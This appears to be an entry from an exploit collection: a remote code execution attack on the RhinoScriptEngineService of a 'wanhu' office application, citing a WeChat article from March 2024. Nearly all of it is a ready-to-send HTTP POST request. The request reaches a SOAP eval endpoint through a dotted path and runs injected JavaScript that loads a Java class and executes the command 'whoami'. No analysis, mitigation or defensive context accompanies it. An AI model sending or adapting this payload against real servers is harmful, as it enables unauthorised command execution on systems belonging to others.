# wanhu_RhinoScriptEngineService_rce

from:https://mp.weixin.qq.com/s/y3nQWnldGiIXIGVz5_2TMg
2024.03.04
@2
```
POST //defaultroot/services/./././RhinoScriptEngineService HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Connection: close
Content-Type: text/xml;charset=UTF-8
SOAPAction: '""'
Content-Length: 1196

<?xml version='1.0' encoding='UTF-8'?>
         <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
           <soapenv:Body>
             <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
               <arg0 xmlns="">
                 <![CDATA[
                 try {
                 load("nashorn:Moziilla_compat.js");
                 } catch (e) {
                 }
                 importPackage(Packages.java.io);
                 importPackage(Packages.java.lang);
                 importPackage(Packages.java.util);
                 importPackage(Packages.java.net);

                 new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName("java.lang.String")]).newInstance(["whoami"]).toString()

                 ]]>
               </arg0>
               <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
               </arg1>
             </eval>
           </soapenv:Body>
         </soapenv:Envelope>
```
